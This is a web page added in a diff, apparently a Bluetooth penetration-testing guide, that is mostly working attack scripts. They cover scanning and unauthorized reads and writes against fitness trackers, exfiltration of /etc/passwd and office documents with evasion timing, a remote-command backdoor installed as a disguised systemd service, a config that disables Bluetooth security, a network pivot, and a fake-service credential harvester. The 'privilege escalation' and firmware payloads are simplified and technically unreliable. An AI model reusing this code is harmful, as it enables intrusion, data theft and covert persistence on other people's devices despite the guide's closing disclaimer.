+<h3 id="scenario-2-fitness-tracker-security-assessment"><strong>Scenario 2: Fitness Tracker Security Assessment</strong><a class="headerlink" href="#scenario-2-fitness-tracker-security-assessment" title="Permanent link">&para;</a></h3>
+<h4 id="phase-1-ble-device-discovery-and-analysis"><strong>Phase 1: BLE Device Discovery and Analysis</strong><a class="headerlink" href="#phase-1-ble-device-discovery-and-analysis" title="Permanent link">&para;</a></h4>
+<p>#!/bin/bash\
+# Fitness Tracker BLE Security Assessment</p>
+<p>echo "=== FITNESS TRACKER BLE PENETRATION TEST ==="</p>
+<p># Step 1: BLE device discovery\
+echo "Step 1: Discovering BLE devices..."\
+sudo timeout 30s hcitool lescan &gt; ble_devices.txt</p>
+<p># Filter for fitness tracker patterns\
+grep -iE "(fitbit|garmin|samsung|polar|xiaomi|amazfit)"
+ble_devices.txt &gt; fitness_targets.txt</p>
+<p>BLE_TARGET=\$(head -1 fitness_targets.txt | grep -oE
+'([0-9A-F]{2}:){5}[0-9A-F]{2}')\
+echo "Target fitness tracker: \$BLE_TARGET"</p>
+<h4 id="phase-2-ble-service-and-characteristic-enumeration"><strong>Phase 2: BLE Service and Characteristic Enumeration</strong><a class="headerlink" href="#phase-2-ble-service-and-characteristic-enumeration" title="Permanent link">&para;</a></h4>
+<p># Step 2: GATT service discovery\
+echo "Step 2: Enumerating GATT services..."\
+gatttool -b \$BLE_TARGET --primary &gt; gatt_services.txt</p>
+<p>echo "Services discovered:"\
+cat gatt_services.txt</p>
+<p># Step 3: Characteristic enumeration\
+echo "Step 3: Enumerating characteristics..."\
+gatttool -b \$BLE_TARGET --characteristics &gt; gatt_characteristics.txt</p>
+<p># Look for interesting characteristics\
+echo "Analyzing characteristics for sensitive data..."\
+grep -iE "(heart|step|sleep|battery|device|name)"
+gatt_characteristics.txt &gt; sensitive_chars.txt</p>
+<h4 id="phase-3-data-extraction-and-analysis"><strong>Phase 3: Data Extraction and Analysis</strong><a class="headerlink" href="#phase-3-data-extraction-and-analysis" title="Permanent link">&para;</a></h4>
+<p># Step 4: Reading sensitive characteristics\
+echo "Step 4: Attempting to read sensitive data..."</p>
+<p>while read line; do\
+if [[
+$line \=\~ handle: 0x([0-9a-fA-F]+) ]]; then  handle="0x${BASH_REMATCH[1]}"\
+echo "Reading characteristic at handle \$handle"\
+gatttool -b \$BLE_TARGET --char-read -a \$handle &gt;&gt;
+extracted_data.txt 2&gt;&amp;1\
+fi\
+done \&lt; gatt_characteristics.txt</p>
+<p># Step 5: Attempting unauthorized writes\
+echo "Step 5: Testing write capabilities..."\
+# Common writeable characteristics\
+WRITABLE_HANDLES=(0x0025 0x0028 0x002b)</p>
+<p>for handle in "\${WRITABLE_HANDLES[@]}"; do\
+echo "Testing write to handle \$handle"\
+gatttool -b \$BLE_TARGET --char-write -a \$handle -n 01 &gt;&gt;
+write_tests.txt 2&gt;&amp;1\
+done</p>
+<h3 id="scenario-3-corporate-bluetooth-infrastructure-assessment"><strong>Scenario 3: Corporate Bluetooth Infrastructure Assessment</strong><a class="headerlink" href="#scenario-3-corporate-bluetooth-infrastructure-assessment" title="Permanent link">&para;</a></h3>
+<h4 id="phase-1-environment-mapping"><strong>Phase 1: Environment Mapping</strong><a class="headerlink" href="#phase-1-environment-mapping" title="Permanent link">&para;</a></h4>
+<p>#!/bin/bash\
+# Corporate Bluetooth Infrastructure Assessment</p>
+<p>echo "=== CORPORATE BLUETOOTH SECURITY ASSESSMENT ==="</p>
+<p># Step 1: Comprehensive device discovery\
+echo "Step 1: Mapping Bluetooth environment..."</p>
+<p># Extended discovery session\
+bluelog -i hci0 -o corporate_devices.log -v -t &amp;\
+BLUELOG_PID=\$!</p>
+<p># Parallel active scanning\
+hcitool scan --length=20 &gt; active_scan.txt &amp;</p>
+<p># BLE scanning\
+sudo hcitool lescan &gt; ble_scan.txt &amp;</p>
+<p>sleep 300 # 5-minute discovery phase\
+kill \$BLUELOG_PID\
+killall hcitool</p>
+<p>echo "Discovery complete. Analyzing results..."</p>
+<h4 id="phase-2-risk-classification"><strong>Phase 2: Risk Classification</strong><a class="headerlink" href="#phase-2-risk-classification" title="Permanent link">&para;</a></h4>
+<p># Step 2: Device categorization and risk assessment\
+echo "Step 2: Categorizing discovered devices..."</p>
+<p># Create device categories\
+mkdir -p device_categories/{high_risk,medium_risk,low_risk,unknown}</p>
+<p># Parse and categorize devices\
+while read line; do\
+if [[
+$line \=\~ ([0-9A-F]{2}:){5}[0-9A-F]{2} ]]; then  mac=$(echo
+$line | grep -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}')  name=$(echo
+\$line | sed 's/.*\t//')</p>
+<div class="highlight"><pre><span></span><code>    \# High-risk devices (keyboards, mice, phones)  
+    if echo &quot;$name&quot; | grep \-iE &quot;(keyboard|mouse|phone|iphone|samsung|pixel)&quot;; then  
+        echo &quot;$mac \- $name&quot; \&gt;\&gt; device\_categories/high\_risk/devices.txt  
+    \# Medium-risk devices (printers, speakers)  
+    elif echo &quot;$name&quot; | grep \-iE &quot;(printer|speaker|headset|audio)&quot;; then  
+        echo &quot;$mac \- $name&quot; \&gt;\&gt; device\_categories/medium\_risk/devices.txt  
+    \# Low-risk devices (fitness trackers, etc.)  
+    elif echo &quot;$name&quot; | grep \-iE &quot;(fitbit|tracker|watch)&quot;; then  
+        echo &quot;$mac \- $name&quot; \&gt;\&gt; device\_categories/low\_risk/devices.txt  
+    else  
+        echo &quot;$mac \- $name&quot; \&gt;\&gt; device\_categories/unknown/devices.txt  
+    fi  
+fi
+</code></pre></div>
+<p>done \&lt; active_scan.txt</p>
+<h2 id="post-exploitation-techniques"><strong>Post-Exploitation Techniques</strong><a class="headerlink" href="#post-exploitation-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="data-exfiltration-via-bluetooth"><strong>Data Exfiltration via Bluetooth</strong><a class="headerlink" href="#data-exfiltration-via-bluetooth" title="Permanent link">&para;</a></h3>
+<h4 id="method-1-covert-data-channel-establishment"><strong>Method 1: Covert Data Channel Establishment</strong><a class="headerlink" href="#method-1-covert-data-channel-establishment" title="Permanent link">&para;</a></h4>
+<p>#!/bin/bash\
+# Establish covert Bluetooth data channel</p>
+<p># Step 1: Create hidden RFCOMM service\
+echo "Establishing covert data channel..."</p>
+<p># Bind to high-numbered channel to avoid detection\
+sudo rfcomm bind 10 \$TARGET_MAC 30</p>
+<p># Step 2: Data exfiltration script\
+exfiltrate_data() {\
+local target_file=\$1\
+local output_channel=\$2</p>
+<div class="highlight"><pre><span></span><code>echo &quot;Exfiltrating $target\_file via Bluetooth...&quot;
+
+\# Encode and transmit data in chunks  
+base64 $target\_file | while read line; do  
+    echo &quot;DATA:$line&quot; \&gt; /dev/rfcomm$output\_channel  
+    sleep 0.1  \# Avoid detection through rate limiting  
+done
+
+echo &quot;EOF&quot; \&gt; /dev/rfcomm$output\_channel
+</code></pre></div>
+<p>}</p>
+<p># Usage example\
+exfiltrate_data "/etc/passwd" "10"</p>
+<h4 id="method-2-bluetooth-file-transfer-exploitation"><strong>Method 2: Bluetooth File Transfer Exploitation</strong><a class="headerlink" href="#method-2-bluetooth-file-transfer-exploitation" title="Permanent link">&para;</a></h4>
+<p># OBEX-based data exfiltration\
+obex_exfiltrate() {\
+local target_mac=\$1\
+local source_dir=\$2</p>
+<div class="highlight"><pre><span></span><code>echo &quot;Starting OBEX exfiltration from $source\_dir&quot;
+
+\# Create temporary FTP directory structure  
+mkdir \-p /tmp/exfil\_staging
+
+\# Copy sensitive files to staging area  
+find $source\_dir \-type f \-name &quot;\*.pdf&quot; \-o \-name &quot;\*.doc\*&quot; \-o \-name &quot;\*.xls\*&quot; | \\  
+while read file; do  
+    cp &quot;$file&quot; /tmp/exfil\_staging/  
+done
+
+\# Transfer files via OBEX  
+cd /tmp/exfil\_staging  
+for file in \*; do  
+    echo &quot;Transferring $file...&quot;  
+    obexftp \-b $target\_mac \-p &quot;$file&quot;  
+done
+</code></pre></div>
+<p>}</p>
+<h3 id="privilege-escalation-techniques"><strong>Privilege Escalation Techniques</strong><a class="headerlink" href="#privilege-escalation-techniques" title="Permanent link">&para;</a></h3>
+<h4 id="bluetooth-stack-exploitation"><strong>Bluetooth Stack Exploitation</strong><a class="headerlink" href="#bluetooth-stack-exploitation" title="Permanent link">&para;</a></h4>
+<p># Exploit Bluetooth service vulnerabilities for privilege escalation\
+privilege_escalation() {\
+echo "Attempting Bluetooth privilege escalation..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Check current privileges  
+id \&gt; /tmp/current\_privs.txt
+
+\# Step 2: Exploit BlueZ service vulnerabilities  
+\# CVE-2020-0022 exploitation example  
+python3 \-c &quot;
+</code></pre></div>
+<p>import socket\
+import struct</p>
+<p>def bluez_exploit():\
+try:\
+# Create HCI socket (requires bluetooth group membership)\
+sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
+socket.BTPROTO_HCI)</p>
+<div class="highlight"><pre><span></span><code>    \# Craft privilege escalation payload  
+    \# This is a simplified example \- actual exploits are more complex  
+    payload \= struct.pack(&#39;\&lt;H&#39;, 0x0401)  \# HCI\_RESET command  
+    payload \+= b&#39;\\x00&#39; \* 100  \# Buffer overflow payload
+
+    sock.send(payload)  
+    print(&#39;Privilege escalation payload sent&#39;)
+
+except PermissionError:  
+    print(&#39;Need bluetooth group membership for exploitation&#39;)  
+except Exception as e:  
+    print(f&#39;Exploitation failed: {e}&#39;)
+</code></pre></div>
+<p>bluez_exploit()\
+"\
+}</p>
+<h4 id="bluetooth-firmware-exploitation"><strong>Bluetooth Firmware Exploitation</strong><a class="headerlink" href="#bluetooth-firmware-exploitation" title="Permanent link">&para;</a></h4>
+<p># Firmware-level exploitation for persistent access\
+firmware_exploit() {\
+echo "Attempting firmware-level exploitation..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Dump Bluetooth firmware  
+echo &quot;Dumping current firmware...&quot;  
+hcitool cmd 0x3f 0x0000 \&gt; firmware\_dump.bin 2\&gt;&amp;1
+
+\# Step 2: Analyze firmware for vulnerabilities  
+echo &quot;Analyzing firmware...&quot;  
+hexdump \-C firmware\_dump.bin | head \-20
+
+\# Step 3: Attempt firmware modification  
+\# WARNING: This can brick devices \- only for authorized testing  
+echo &quot;Attempting firmware modification...&quot;
+
+\# Create malicious firmware patch  
+python3 \-c &quot;
+</code></pre></div>
+<p>import struct</p>
+<p>def create_firmware_patch():\
+# Create a simple firmware patch\
+patch = b'\x90' * 1024 # NOP sled\
+patch += b'\x31\xc0' # xor eax, eax (example shellcode)</p>
+<div class="highlight"><pre><span></span><code>with open(&#39;firmware\_patch.bin&#39;, &#39;wb&#39;) as f:  
+    f.write(patch)
+
+print(&#39;Firmware patch created&#39;)
+</code></pre></div>
+<p>create_firmware_patch()\
+"\
+}</p>
+<h3 id="persistence-mechanisms"><strong>Persistence Mechanisms</strong><a class="headerlink" href="#persistence-mechanisms" title="Permanent link">&para;</a></h3>
+<h4 id="bluetooth-service-backdoor"><strong>Bluetooth Service Backdoor</strong><a class="headerlink" href="#bluetooth-service-backdoor" title="Permanent link">&para;</a></h4>
+<p># Install persistent Bluetooth backdoor\
+install_bluetooth_backdoor() {\
+echo "Installing Bluetooth persistence mechanism..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Create backdoor service  
+cat \&gt; /tmp/bt\_backdoor.py \&lt;\&lt; &#39;EOF&#39;
+</code></pre></div>
+<p>#!/usr/bin/env python3\
+import bluetooth\
+import subprocess\
+import threading\
+import time</p>
+<p>class BluetoothBackdoor:\
+def __init__(self, channel=22):\
+self.channel = channel\
+self.server_socket = None</p>
+<div class="highlight"><pre><span></span><code>def start\_server(self):  
+    self.server\_socket \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
+    self.server\_socket.bind((&quot;&quot;, self.channel))  
+    self.server\_socket.listen(1)
+
+    print(f&quot;Bluetooth backdoor listening on channel {self.channel}&quot;)
+
+    while True:  
+        try:  
+            client\_socket, address \= self.server\_socket.accept()  
+            print(f&quot;Connection from {address}&quot;)
+
+            \# Handle client in separate thread  
+            client\_thread \= threading.Thread(  
+                target=self.handle\_client,  
+                args=(client\_socket,)  
+            )  
+            client\_thread.daemon \= True  
+            client\_thread.start()
+
+        except Exception as e:  
+            print(f&quot;Server error: {e}&quot;)  
+            time.sleep(5)
+
+def handle\_client(self):  
+    try:  
+        while True:  
+            data \= client\_socket.recv(1024).decode(&#39;utf-8&#39;).strip()  
+            if not data:  
+                break
+
+            if data.startswith(&#39;CMD:&#39;):  
+                command \= data\[4:\]  
+                try:  
+                    result \= subprocess.check\_output(  
+                        command, shell=True,  
+                        stderr=subprocess.STDOUT  
+                    )  
+                    client\_socket.send(result)  
+                except Exception as e:  
+                    client\_socket.send(f&quot;Error: {e}&quot;.encode())
+
+            elif data \== &#39;PING&#39;:  
+                client\_socket.send(b&#39;PONG&#39;)
+
+            elif data \== &#39;EXIT&#39;:  
+                break
+
+    except Exception as e:  
+        print(f&quot;Client error: {e}&quot;)  
+    finally:  
+        client\_socket.close()
+</code></pre></div>
+<p>if __name__ == "__main__":\
+backdoor = BluetoothBackdoor()\
+backdoor.start_server()\
+EOF</p>
+<div class="highlight"><pre><span></span><code>\# Step 2: Make executable and install  
+chmod \+x /tmp/bt\_backdoor.py
+
+\# Step 3: Create systemd service for persistence  
+cat \&gt; /tmp/bluetooth-backdoor.service \&lt;\&lt; &#39;EOF&#39;
+</code></pre></div>
+<p>[Unit]\
+Description=Bluetooth Service Extension\
+After=bluetooth.service\
+Requires=bluetooth.service</p>
+<p>[Service]\
+Type=simple\
+ExecStart=/usr/bin/python3 /opt/bluetooth-backdoor.py\
+Restart=always\
+RestartSec=10</p>
+<p>[Install]\
+WantedBy=multi-user.target\
+EOF</p>
+<div class="highlight"><pre><span></span><code>echo &quot;Backdoor service created. Install with:&quot;  
+echo &quot;sudo cp /tmp/bt\_backdoor.py /opt/bluetooth-backdoor.py&quot;  
+echo &quot;sudo cp /tmp/bluetooth-backdoor.service /etc/systemd/system/&quot;  
+echo &quot;sudo systemctl enable bluetooth-backdoor.service&quot;
+</code></pre></div>
+<p>}</p>
+<h4 id="registryconfiguration-persistence"><strong>Registry/Configuration Persistence</strong><a class="headerlink" href="#registryconfiguration-persistence" title="Permanent link">&para;</a></h4>
+<p># Modify Bluetooth configuration for persistence\
+config_persistence() {\
+echo "Establishing configuration-based persistence..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Backup original configuration  
+sudo cp /etc/bluetooth/main.conf /etc/bluetooth/main.conf.backup
+
+\# Step 2: Modify configuration for backdoor access  
+cat \&gt;\&gt; /etc/bluetooth/main.conf \&lt;\&lt; &#39;EOF&#39;
+</code></pre></div>
+<p># Hidden backdoor configuration\
+[General]\
+# Enable debug mode (hidden)\
+Debug=true\
+# Allow all device classes\
+Class=0x000000\
+# Disable security for specific services\
+Security=off</p>
+<p>[Policy]\
+# Allow connections from any device\
+AutoConnect=true\
+ReconnectAttempts=0\
+ReconnectIntervals=1,2,4,8,16\
+EOF</p>
+<div class="highlight"><pre><span></span><code>echo &quot;Configuration persistence established&quot;
+</code></pre></div>
+<p>}</p>
+<h3 id="advanced-post-exploitation-techniques"><strong>Advanced Post-Exploitation Techniques</strong><a class="headerlink" href="#advanced-post-exploitation-techniques" title="Permanent link">&para;</a></h3>
+<h4 id="bluetooth-network-pivoting"><strong>Bluetooth Network Pivoting</strong><a class="headerlink" href="#bluetooth-network-pivoting" title="Permanent link">&para;</a></h4>
+<p># Use Bluetooth as network pivot point\
+bluetooth_pivot() {\
+echo "Setting up Bluetooth network pivot..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Create Bluetooth PAN (Personal Area Network)  
+sudo modprobe bnep
+
+\# Step 2: Configure bridge interface  
+sudo brctl addbr bt-bridge  
+sudo ifconfig bt-bridge up
+
+\# Step 3: Setup routing for pivot  
+echo &quot;1&quot; | sudo tee /proc/sys/net/ipv4/ip\_forward
+
+\# Step 4: Create pivot script  
+cat \&gt; /tmp/bt\_pivot.py \&lt;\&lt; &#39;EOF&#39;
+</code></pre></div>
+<p>#!/usr/bin/env python3\
+import bluetooth\
+import socket\
+import threading\
+import select</p>
+<p>class BluetoothPivot:\
+def __init__(self, target_mac, target_port=22):\
+self.target_mac = target_mac\
+self.target_port = target_port\
+self.bt_socket = None\
+self.tcp_socket = None</p>
+<div class="highlight"><pre><span></span><code>def start\_pivot(self):  
+    \# Create Bluetooth RFCOMM socket  
+    self.bt\_socket \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
+    self.bt\_socket.bind((&quot;&quot;, bluetooth.PORT\_ANY))  
+    self.bt\_socket.listen(1)
+
+    print(f&quot;Bluetooth pivot listening for connections...&quot;)
+
+    while True:  
+        client\_socket, address \= self.bt\_socket.accept()  
+        print(f&quot;Pivot connection from {address}&quot;)
+
+        \# Handle pivot in separate thread  
+        pivot\_thread \= threading.Thread(  
+            target=self.handle\_pivot,  
+            args=(client\_socket,)  
+        )  
+        pivot\_thread.start()
+
+def handle\_pivot(self, bt\_client):  
+    \# Connect to target service via TCP  
+    tcp\_socket \= socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
+    tcp\_socket.connect((&#39;target\_system&#39;, self.target\_port))
+
+    \# Relay data between Bluetooth and TCP  
+    while True:  
+        ready \= select.select(\[bt\_client, tcp\_socket\], \[\], \[\])
+
+        for sock in ready\[0\]:  
+            data \= sock.recv(4096)  
+            if not data:  
+                return
+
+            if sock \== bt\_client:  
+                tcp\_socket.send(data)  
+            else:  
+                bt\_client.send(data)
+</code></pre></div>
+<p>if __name__ == "__main__":\
+pivot = BluetoothPivot("target_mac_address")\
+pivot.start_pivot()\
+EOF</p>
+<div class="highlight"><pre><span></span><code>chmod \+x /tmp/bt\_pivot.py  
+echo &quot;Bluetooth pivot configured&quot;
+</code></pre></div>
+<p>}</p>
+<h4 id="credential-harvesting-via-bluetooth"><strong>Credential Harvesting via Bluetooth</strong><a class="headerlink" href="#credential-harvesting-via-bluetooth" title="Permanent link">&para;</a></h4>
+<p># Harvest credentials through Bluetooth services\
+credential_harvest() {\
+echo "Starting Bluetooth credential harvesting..."</p>
+<div class="highlight"><pre><span></span><code>\# Step 1: Monitor Bluetooth authentication attempts  
+cat \&gt; /tmp/bt\_credential\_logger.py \&lt;\&lt; &#39;EOF&#39;
+</code></pre></div>
+<p>#!/usr/bin/env python3\
+import bluetooth\
+import hashlib\
+import time\
+import json</p>
+<p>class CredentialHarvester:\
+def __init__(self):\
+self.credentials = []\
+self.log_file = "/tmp/bt_credentials.log"</p>
+<div class="highlight"><pre><span></span><code>def setup\_fake\_service(self):  
+    \# Create fake service that requires authentication  
+    server\_sock \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
+    server\_sock.bind((&quot;&quot;, bluetooth.PORT\_ANY))  
+    server\_sock.listen(1)
+
+    \# Advertise fake service  
+    bluetooth.advertise\_service(  
+        server\_sock, &quot;File Transfer Service&quot;,  
+        service\_classes=\[bluetooth.SERIAL\_PORT\_CLASS\],  
+        profiles=\[bluetooth.SERIAL\_PORT\_PROFILE\]  
+    )
+
+    print(&quot;Fake authentication service started...&quot;)
+
+    while True:  
+        client\_sock, client\_info \= server\_sock.accept()  
+        self.handle\_auth\_attempt(client\_sock, client\_info)
+
+def handle\_auth\_attempt(self, client\_sock, client\_info):  
+    try:  
+        client\_sock.send(b&quot;Authentication required\\nUsername: &quot;)  
+        username \= client\_sock.recv(1024).decode().strip()
+
+        client\_sock.send(b&quot;Password: &quot;)  
+        password \= client\_sock.recv(1024).decode().strip()
+
+        \# Log credentials  
+        cred\_data \= {  
+            &quot;timestamp&quot;: time.time(),  
+            &quot;client\_mac&quot;: client\_info\[0\],  
+            &quot;username&quot;: username,  
+            &quot;password&quot;: password,  
+            &quot;password\_hash&quot;: hashlib.md5(password.encode()).hexdigest()  
+        }
+
+        self.credentials.append(cred\_data)  
+        self.save\_credentials()
+
+        \# Send fake failure to avoid suspicion  
+        client\_sock.send(b&quot;Authentication failed\\n&quot;)
+
+    except Exception as e:  
+        print(f&quot;Error handling auth: {e}&quot;)  
+    finally:  
+        client\_sock.close()
+
+def save\_credentials(self):  
+    with open(self.log\_file, &#39;w&#39;) as f:  
+        json.dump(self.credentials, f, indent=2)
+</code></pre></div>
+<p>if __name__ == "__main__":\
+harvester = CredentialHarvester()\
+harvester.setup_fake_service()\
+EOF</p>
+<div class="highlight"><pre><span></span><code>chmod \+x /tmp/bt\_credential\_logger.py  
+echo &quot;Credential harvesting setup complete&quot;
+</code></pre></div>
+<p>}</p>
+<h2 id="conclusion"><strong>Conclusion</strong><a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
+<p>This comprehensive guide now includes realistic, scenario-based
+walkthroughs and extensive post-exploitation techniques for Bluetooth
+security testing. The step-by-step scenarios demonstrate how to combine
+different tools and techniques in logical sequences, from initial
+reconnaissance through complete system compromise.</p>
+<p>The post-exploitation section covers advanced techniques including data
+exfiltration, privilege escalation, persistence mechanisms, network
+pivoting, and credential harvesting - providing a complete picture of
+what can occur after initial Bluetooth compromise.</p>
+<p><strong>Important Ethical Reminder</strong>: All techniques and scenarios presented
+here are for authorized security testing and educational purposes only.
+Always obtain proper written authorization before conducting any
+security assessments, and ensure compliance with all applicable laws and
+regulations.</p>
+<p><strong>Disclaimer</strong>: This information is provided for educational and
+authorized security testing purposes only. Unauthorized access to
+Bluetooth devices is illegal and unethical. Always obtain proper
+permission before conducting security tests.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.top", "toc.integrate"], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
